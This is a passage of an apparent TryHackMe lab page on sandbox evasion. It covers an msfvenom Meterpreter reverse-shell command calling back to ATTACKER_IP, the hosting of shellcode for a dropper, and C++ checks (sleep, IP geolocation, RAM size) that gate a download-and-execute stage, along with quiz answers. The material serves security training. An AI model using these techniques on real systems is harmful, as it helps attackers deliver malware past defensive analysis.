executed in California, you can make an educated guess that the binary has ended up in a Sandbox.&nbsp;<span style="font-size:1rem">You may choose to implement a geolocation filter on your program that checks if the IP Address block is owned by the company you are targeting or if it is from a residential address space. There are several services that you can use to check this information:</span></p><ul><li><span style="font-size:1rem"><a href="https://ifconfig.me/" target="_blank">ifconfig.me</a></span></li><li><a href="https://rdap.arin.net/registry/ip/1.1.1.1" target="_blank">https://rdap.arin.net/registry/ip/1.1.1.1</a><a href="https://rdap.arin.net/registry/ip/1.1.1.1" target="_blank"></a></li></ul><p>IfConfig.me can be used to retrieve your current IP Address, with additional information being optional. Combining this with ARIN's RDAP allows you to determine the ISP returned in an easy to parse format (JSON).&nbsp;</p><p>It is important to note that this method will only work if the host has internet access. Some organizations may build a block list of specific domains, so you should be 100% sure that this method will work for the organization you are attempting to leverage this against.</p><p><span style="font-size:24px">Checking System Information</span></p><p>Another incredibly popular method is to observe system information. Most Sandboxes typically have reduced resources. A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine:</p><p style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/e573e6b24f5adab546ec0034be6537d2.png"><br></p><p style="text-align:center"><i>a Screenshot of the SystemInfo command from Any.Run</i></p><p style="text-align:left">Most workstations in a network typically have 2-8 CPU cores, 8-32GB of RAM, and 256GB-1TB+ of drive space. This is incredibly dependent on the organization that you are targeting, but generally, you can expect more than 2 CPU cores per system and more than 4GB of RAM. Knowing this, we can tailor our code to query for basic system info (CPU core count, RAM amount, Disk size, etc).</p><p style="text-align:left">By no means is this an exhaustive list, but here are some additional examples of things you may be able to filter on:</p><ul><li style="text-align:left">Storage Medium Serial Number</li><li style="text-align:left">PC Hostname</li><li style="text-align:left">BIOS/UEFI Version/Serial Number</li><li style="text-align:left">Windows Product Key/OS Version</li><li style="text-align:left">Network Adapter Information</li><li style="text-align:left">Virtualization Checks</li><li style="text-align:left">Current Signed in User</li><li style="text-align:left">and much more!</li></ul><p><span style="font-size:24px">Querying Network Information</span></p><div>The last method is the most open-ended method that we will be covering. Because of its open-endedness it is considered one of the more advanced methods as it involves querying information about the Active Directory domain. </div><div><br></div><div>Almost no Malware Sandboxes are joined in a domain, so it's relatively safe to assume if the machine is not joined to a domain, it is not the right target!&nbsp;<span style="font-size:1rem">However, you cannot always be too sure, so you should collect some information about the domain to be safe. There are many objects that you can query; here are some to consider:<br><br></span></div><ul><li><span style="font-size:1rem">Computers</span></li><li><span style="font-size:1rem">User accounts</span></li><li><span style="font-size:1rem">Last User Login(s)</span></li><li>Groups</li><li>Domain Admins</li><li>Enterprise Admins</li><li><span style="font-size:1rem">Domain Controllers</span></li><li>Service Accounts</li><li><span><a class="oeJBYmS5 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;oeJBYmS5&#39;)">DNS</a> Servers</span></li></ul><p>These techniques can vary in difficulty; therefore, you should consider how much time and effort you want to spend building out these evasion methods. A simple method, such as checking the systems environment variables (this can be done with <b>echo %VARIABLE%</b> or to display all variables, use the <b>set </b>command) for an item like the LogonServer, LogonUserSid, or LogonDomain may be much easier than implementing a Windows API.</p><p><span style="font-size:24px">Setting the Stage</span><br></p><p>Now that you have a better understanding of what Sandbox Bypass method types exist, we will take it to the next step and implement some of the Sandbox Bypasses in the next task. </p><p>Before we move on to the next task, we're going to be starting with a basic dropper that retrieves shellcode from a Web Server (specifically from /index.raw) and injects it into memory, and executes the shellcode. It's important to note that all shellcode must be generated with MSFVenom in a raw format, and must be 64-bit, not 32-bit. It can be generated with the following command.</p><p>
+
+</p><div class="terminal-container">
+    <div class="terminal-content">
+        <div class="terminal-top">
+            Generating Shellcode with MSFVenom
+        </div>
+        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@attack-box</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">1337</span> -f raw -o index.raw</span></span>
+<span class="token output">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Saved as: index.raw
+</span><span class="token command"><span class="token info punctuation"><span class="token user">user@attack-box</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server <span class="token number">8080</span></span></span>
+<span class="token output"><span>Serving <a class="Nbg9Glwg glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Nbg9Glwg&#39;)">HTTP</a> on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.14.212 - - [20/Mar/2022 22:04:22] "GET /index.raw HTTP/1.1" 200 -
+</span></span></code>
+        </pre>
+    </div>
+</div>
+
+<p></p><p><span>The shellcode should then be hosted on the AttackBox via any <a class="2lQIFRlB glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;2lQIFRlB&#39;)">HTTP</a> Server. Python3's http.server module is highly portable and flexible and will serve as a good base for this task. In the real world, you may host your shellcode on your C2 server. For the purposes of the lab, we will be utilizing the Attackbox with no C2 server.</span></p><p>The code attached to this task has been tested and compiled using Visual Studio 2019 (or above). Download the dropper.cpp, and open it.&nbsp;<span style="font-size:1rem">It's important to note that there are several placeholder values on lines 16, 22, 24, 27, and 33 that you must update to make the code function properly. Once you have altered the values, compile the code for a 64-bit release.</span></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom hacker-green">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Read the above task to learn about Sandbox Evasion Techniques.
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="3">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Question Done
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Download the task files and modify the .cpp file to retrieve the MSFVenom generated shellcode.</p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="3">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Question Done
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Which Sandbox Evasion method would you use to abuse a Sandbox that runs for a short period of time?</p><p><b>Note</b>: most Sandboxes are only allowed to run for a short period of time</p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********" value="Sleeping" disabled="">
+                            <input type="hidden" value="3">
+                            <input type="hidden" value="3">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Correct Answer
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Which&nbsp;<span style="font-size:1rem">Sandbox Evasion method would you use to check the Sandboxes system information for virtualised devices?</span></p><p><span style="font-size:1rem"><b>Note:</b> Sandboxes usually run with limited resources and virtualised devices</span></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******** ****** ***********" value="Checking System Information" disabled="">
+                            <input type="hidden" value="4">
+                            <input type="hidden" value="3">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Correct Answer
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-4">
+                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse4" aria-expanded="false">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 4                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Implementing Various Evasion Techniques
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"><i class="far fa-download text-lblue" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a downloadable file"></i></span>
+                        </a>
+                    </div>
+                    <div id="collapse4" class="collapse show" data-parent="#taskContent" style="">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"><form class="float-right" method="post" action="https://tryhackme.com/material/deploy">
+                            <input type="hidden" name="roomCode" value="sandboxevasion">
+                            <input type="hidden" name="id" value="62411d902dad310043c2513a">
+                            <button type="submit" class="btn btn-primary mb-3 ml-3" value="Download">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Download Task Files</button>
+                        </form> <p><span style="font-size:24px">Diving into Sandbox Evasion</span></p><span style="font-size:24px">
+</span><p>With this base code acquired, we will take our first step into the world of Sandbox Evasion. We're going to start with our sleep because it is the simplest.&nbsp;</p><span style="font-size:16px">
+</span><p><span style="font-size:24px">Taking a Nap</span></p><span style="font-size:16px">
+</span><div>We can take our template code from the previous task and add a Sleep statement for 120,000MS&nbsp; to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to be sure; however, 2 minutes will suffice for testing purposes.&nbsp;<span style="font-size:1rem">We'll now add our Sleep statement in the main function:&nbsp;<br></span></div><div><span style="font-size:1rem"><br></span></div><div><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>isDomainController <span class="token operator">==</span> TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">downloadAndExecute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Domain Controller Not Found!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> </code></pre></div><div><span style="font-size:1rem"><br></span></div><span style="font-size:16px">
+</span><div><b>Testing our Code</b></div><span style="font-size:16px">
+</span><div>After this is done, we can compile and upload the code to&nbsp;<a href="http://any.run/">Any.Run</a>. You can read along with the following tests, and see their behaviour on <a href="http://any.run/" target="_blank">Any.Run</a> by following the links. This will serve as our test-ground for Sandbox evasion as it provides highly detailed information for us. Reviewing the two runs:<br></div><span style="font-size:16px">
+</span><ul>
+   <li style="line-height:2"><a href="https://app.any.run/tasks/0799e9b3-dddc-4838-ba2d-c95fc0a7e63b" target="_blank">Sleep Bypass</a></li>
+   <li><a href="https://app.any.run/tasks/ad3cf5b4-1bdf-4005-8578-507334f5c8ac" target="_blank">No Sleep Bypass</a></li>
+</ul><span style="font-size:16px">
+</span><p>Looking at the two results side by side, we notice no activity occurring in our Sleepy run.</p><span style="font-size:16px">
+</span><p style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/423f07b56f8ce5f9d353c3b96d0f0f35.png" style="width:954.91px;height:482.938px"></p><span style="font-size:16px">
+</span><p style="text-align:center"><i>Screenshot from Any.Run showing our Sleep bypass function worked as intended.</i></p><span style="font-size:16px">
+</span><p style="text-align:left"><span> Where in our not-sleepy run, we can see an <a class="Vn0SgT0k glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Vn0SgT0k&#39;)">HTTP</a> Request go out to Cloudflare.</span></p><span style="font-size:16px">
+</span><p style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/cce67bc687e464e7ac65617233fe2c78.png" style="width:980.131px;height:489.281px"></p><span style="font-size:16px">
+</span><p style="text-align:center"><i>Screenshot from Any.Run showing our results with no Sandbox Evasion techniques implemented</i></p><span style="font-size:16px">
+</span><p>Congratulations! We have successfully created our first Sandbox Evasion technique. While this is a simple technique, it is incredibly powerful and has allowed us to run out Any.Run's one-minute timer. As stated in the last task, this method may or may not work due to various blog posts that have been published showing that Blue Teamers can create sleep timer bypasses. A better implementation would be to waste computing time by doing heavy math.</p><span style="font-size:16px">
+</span><p><br></p><span style="font-size:16px">
+</span><p><span style="font-size:24px">Geolocation Filtering</span></p><span style="font-size:16px">
+</span><p>Moving onto our next method of evading execution of our shellcode on a Sandbox, we will be leveraging Geolocation blocks. Fortunately, we will be able to leverage a good amount of code that is already written for us. Portions of the "downloadAndExecute()" function can be re-used for this. We will be reusing the following components:</p><span style="font-size:16px">
+</span><ul>
+   <li>Website URL (formerly the c2URL variable)</li>
+   <li>Internet Stream (formerly the stream variable)</li>
+   <li>String variable (formerly the s variable)</li>
+   <li>Buffer Space (formerly the Buff variable)</li>
+   <li>Bytes Read (formerly the unsigned long bytesRead variable)</li>
+   <li>Lastly, the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)" target="_blank">URLOpenBlockingStreamA </a>function</li>
+</ul><span style="font-size:16px">
+</span><p style="line-height:1"><span style="font-weight:bolder">Integrating This into our Code</span></p><span style="font-size:16px">
+</span><p>This translates to an actual function that looks so:</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">BOOL <span class="token function">checkIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
+ <span class="token comment">// Declare the Website URL that we would like to vicit</span>
+    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> websiteURL <span class="token operator">=</span> <span class="token string">"&lt;https://ifconfig.me/ip&gt;"</span><span class="token punctuation">;</span>   
+ <span class="token comment">// Create an Internet Stream to access the website</span>
+    IStream<span class="token operator">*</span> stream<span class="token punctuation">;</span>   
+ <span class="token comment">// Create a string variable where we will store the string data received from the website</span>
+    string s<span class="token punctuation">;</span>   
+  <span class="token comment">// Create a space in memory where we will store our IP Address</span>
+    <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytesRead<span class="token punctuation">;</span>   
+ <span class="token comment">// Open an Internet stream to the remote website</span>
+    <span class="token function">URLOpenBlockingStreamA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> websiteURL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stream<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+ <span class="token comment">// While data is being sent from the webserver, write it to memory</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       
+        stream<span class="token operator">-&gt;</span><span class="token function">Read</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>       
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0U</span> <span class="token operator">==</span> bytesRead<span class="token punctuation">)</span> <span class="token punctuation">{</span>           
+            <span class="token keyword">break</span><span class="token punctuation">;</span>       
+        <span class="token punctuation">}</span>       
+        s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>   
+    <span class="token punctuation">}</span>   
+  <span class="token comment">// Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token string">"VICTIM_IP"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       
+        <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>   
+    <span class="token punctuation">}</span>   
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>       
+    <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>   
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> </code></pre><p><span style="font-family:Ubuntu;font-size:1rem">This code can be broken down into the following steps:</span></p><ol><li>Declare the required variables mentioned above.</li><li>Open an internet stream with the URLOpenBlockingStreamA&nbsp;function to ifconfig.me/ip to check the current IP Address.</li><li><span style="font-family:Ubuntu">Write the data stream returned from the&nbsp;</span><span style="font-family:Ubuntu">URLOpenBlockingStreamA function to the memory.</span>&nbsp;</li><li><span style="font-family:Ubuntu">Append the data from the memory buffer to a string variable.</span></li><li><span style="font-family:Ubuntu">Check and see if the string data is equal to the Victim's IP Address.</span></li><li><span style="font-family:Ubuntu">If True, return TRUE; if False, return FALSE.<br></span></li></ol><span style="font-family:Ubuntu"><span style="font-size:16px">Now we must modify our main function so that we can leverage our newly created function:</span></span><p></p><p><span style="font-family:Ubuntu"></span></p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> TRUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">downloadAndExecute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"HTTP/418 - I'm a Teapot!"</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> </code></pre><p><span style="font-size:1rem"><span>The code above invokes the new function, checkIP(), and if the IP Address returns TRUE, then invoke the downloadAndExecute() function to call the shellcode from our <a class="qtJCSppJ glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;qtJCSppJ&#39;)">C2</a> server. If FALSE, return HTTP/418 - I'm a teapot!".</span></span><br></p><span style="font-size:16px">
+</span><p><b><br>Testing Our Code</b></p><span style="font-size:16px">
+</span><p><span>Now that we have wrapped up our second Sandbox Evasion technique, it is very important to know that this is an incredibly common <a class="WbZf3MFY glossary-term" onclick="initPopOver(&#39;TTP&#39;, &#39;WbZf3MFY&#39;)">TTP</a> used by threat actors. Both APTs and Red Teams alike often use services to check the "Abuse Info" of an IP Address to gather information about an IP Address to determine if it is a legitimate company or not. </span><a href="https://app.any.run/" target="_blank">Any.Run</a> is well aware of this Anti-Sandboxing technique and has even flagged it in our instance. You can see the detailed results at the links below:</p><span style="font-size:16px">
+</span><ul>
+   <li><a href="https://app.any.run/tasks/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a" target="_blank">One with an IP Address Filter</a></li>
+   <li><a href="https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085" target="_blank">One without an IP Address Filter</a></li>
+</ul><span style="font-size:16px">
+</span><p>Looking at the two results, we can see that ifconfig.me is flagged as a "questionable/Potentially Malicious" site used to check for your external IP Address. In fact, this Sandbox evasion method ended up hurting our score, so it should be used as a last resort <i>or </i>with a recently deployed/custom IP Address checking server. The full report can <a href="https://any.run/report/c98a60e5d0390ba4ad784b76ec0ce3602272452ffb44ce73dbb849906f2cff4d/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a" target="_blank">be found here</a>.&nbsp;</p><span style="font-size:16px">
+</span><p><img src="./TryHackMe _ Sandbox Evasion_files/4f9474a7e5ca35c0b58e09702fd966d7.png" style="width:1075.5px;height:543.613px"><br></p><span style="font-size:16px">
+</span><p style="text-align:center"><i>A Screenshot from Any.Run showing our run with Sandbox Evasion techniques applied</i></p><span style="font-size:16px">
+</span><p><img src="./TryHackMe _ Sandbox Evasion_files/c5760cd217e139d3e40161fc901563b1.png" style="width:1069.21px;height:541.055px"><span style="font-size:24px"><br></span></p><span style="font-size:16px">
+</span><p style="text-align:center"><i><span>Screenshot from Any.Run showing an outbound <a class="FfsfeWj5 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;FfsfeWj5&#39;)">HTTP</a> Request</span></i></p><span style="font-size:16px">
+</span><div>As you are now aware, not all Sandbox escaping techniques may be helpful in certain situations; you must pick and choose which evasion techniques you are going to implement carefully, as some may do more harm than good.</div><span style="font-size:16px">
+</span><div><br></div><span style="font-size:16px">
+</span><p><span style="font-size:24px">C</span><span style="font-size:24px">hecking System Information</span><br></p><span style="font-size:16px">
+</span><p>We're going to start off the System Information category with - the amount of RAM a system has. It’s important to note that Windows measures data in a non-standard format. If you have ever bought a computer that said it has “256GB of SSD Storage”, after turning it on, you would have closer to 240GB. This is because Windows measures data in units of 1024-bytes instead of 1000-bytes. Be warned that this can get very confusing very quickly. Fortunately for us, we will be working in such small amounts of memory that accuracy can be a “best guess” instead of an exact number. Now that we know this, how can we determine how much memory is installed on the System?<br><br></p><span style="font-size:16px">
+</span><p><b>Checking System Memory</b></p><span style="font-size:16px">
+</span><p>Fortunately, this is a relatively easy thing to find out. We only need the Windows header file included, and we can call a specific Windows API,&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex">GlobalMemoryStatusEx</a>, to retrieve the data for us. To get this information, we must declare the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex">MEMORYSTATUSEX</a>&nbsp;struct; then, we must set the size of the dwLength member to the size of the struct. Once that is done, we can then call the GlobalMemoryStatusEx Windows API to populate the struct with the memory information.</p><span style="font-size:16px">
+</span><p>In this scenario, we are specifically interested in the total amount of physical memory installed on the system, so we will print out the ullTotalPhys member of the MEMORYSTATUSEX struct to get the size of the memory installed in the system in Bytes. We can then divide by 1024 3x to get the value of memory installed in GiB. Now let’s see what this looks like in C++:</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token comment">// Declare the MEMORYSTATUSEX Struct    </span>
+   MEMORYSTATUSEX statex<span class="token punctuation">;</span>
+<span class="token comment">// Set the length of the struct to the size of the struct    </span>
+   statex<span class="token punctuation">.</span>dwLength <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>statex<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    </span>
+   <span class="token function">GlobalMemoryStatusEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>statex<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Print the physical memory installed on the system    </span>
+   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"There is "</span> <span class="token operator">&lt;&lt;</span> statex<span class="token punctuation">.</span>ullTotalPhys<span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"GiB of memory on the system."</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </code></pre><pre><p><span style="font-family:Ubuntu;font-size:16px">This code can be broken down into the following steps:</span></p><ol><li><span style="font-size:16px;font-family:Ubuntu">We're going to declare the MEMORYSTATUSEX Struct; this will be populated with info from the GlobalMemoryStatusEx WinAPI.</span></li><li><span style="font-size:16px;font-family:Ubuntu">Now, we must set the length of the struct so that we can populate it with data. To do so, we're going to use the sizeof function.</span></li><li><span style="font-size:16px;font-family:Ubuntu">Now that we have the length of the struct, we can populate it with data from the GlobalMemoryStatusEx WinAPI.</span></li><li><span style="font-size:16px;font-family:Ubuntu">We can now read the total memory amount from the system.</span></li></ol></pre><p><span style="font-weight:bolder">Integrating This into our Code</span></p><span style="font-size:16px">
+</span><p>Now that we have the technical know-how, we should integrate this check into our code. Generally speaking (You should verify this by yourself), most Sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory count is greater than 5; if it is not, exit the program; if it is, continue execution. We will not be modifying the downloadAndExecute function anymore; from here on, we will be adding new functions<span style="font-size:1rem">&nbsp;and changing the main function.</span></p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">BOOL <span class="token function">memoryCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token comment">// This function will check and see if the system has 5+GB of RAM</span>
+<span class="token comment">// Declare the MEMORYSTATUSEX Struct    </span>
+    MEMORYSTATUSEX statex<span class="token punctuation">;</span>
+<span class="token comment">// Set the length of the struct to the size of the struct    </span>
+    statex<span class="token punctuation">.</span>dwLength <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>statex<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    </span>
+    <span class="token function">GlobalMemoryStatusEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>statex<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Checks if the System Memory is greater than 5.00GB    </span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>statex<span class="token punctuation">.</span>ullTotalPhys <span class="token operator">/</span> <span class="token number">1024</span> <span class="token operator">/</span> <span class="token number">1024</span> <span class="token operator">/</span> <span class="token number">1024</span> <span class="token operator">&gt;=</span> <span class="token number">5.00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        
+       <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>    
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        
+       <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token comment">// Evaluates if the installed RAM amount is greater than 5.00 GB,</span>
+<span class="token comment">//if true download Shellcode, if false, exit the program.    </span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memoryCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        
+    <span class="token function">downloadAndExecute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        
+       exit<span class="token punctuation">;</span>    
+    <span class="token punctuation">}</span>
+<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </code></pre><span style="font-size:16px">
+</span><pre><span style="white-space:normal;background-color:rgb(234, 234, 237)">
+</span></pre><span style="font-size:16px">
+
+</span><p><span style="font-family:Ubuntu">This code can be broken down into the following steps:</span></p><ol><li><span style="font-family:Ubuntu">We're creating a new function (memoryCheck) that will return True or False.</span></li><li><span style="font-family:Ubuntu">We use the previous code from above to get the size of the system memory.</span></li><li><span style="font-family:Ubuntu">We check if the system memory is greater than 5GB; if it is true, we return TRUE; if false, we return FALSE.</span></li><li><span style="font-family:Ubuntu">The value returned from the function determines if we download and execute stage 2 or not.</span></li></ol><p style="font-family:Ubuntu, monospace;font-size:16px;white-space:normal"><span style="font-size:1rem"><b>Testing our Code</b></span></p><p style="font-family:Ubuntu, monospace;font-size:16px;white-space:normal"><span style="font-size:1rem">Now that we have finished the second of our third Sandbox Evasion method, it is important that we test it to ensure that it works. To do so, we are going to upload our files to&nbsp;</span><a href="http://any.run/">Any.Run</a></p><ul style="font-family:Ubuntu, monospace;font-size:16px;white-space:normal"><li><a href="https://app.any.run/tasks/e2f6a64b-02ef-43ca-bea5-e724b234001c" target="_blank">One with the Memory Check function</a></li><li><a href="https://app.any.run/tasks/7d06fc67-35c9-45f5-8865-af9dd6486075" target="_blank">One without the Memory Check function</a></li></ul><p style="font-family:Ubuntu, monospace;font-size:16px;white-space:normal"><span style="font-size:1rem">Looking at the two samples side by side shows some interesting differences; in the first submission, our memory check function works without any issue and gracefully exits the program when it notices the device has less than 5GB of RAM.</span></p><span style="font-size:16px">
+</span><p style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/18f24c068bf41867bb839c910c192de5.png" style="width:910px;height:459.523px"></p><span style="font-size:16px">
+</span><p style="text-align:center"><i>Screenshot from Any.Run verifying that our Memory Check function worked as intended</i></p><span style="font-size:16px">
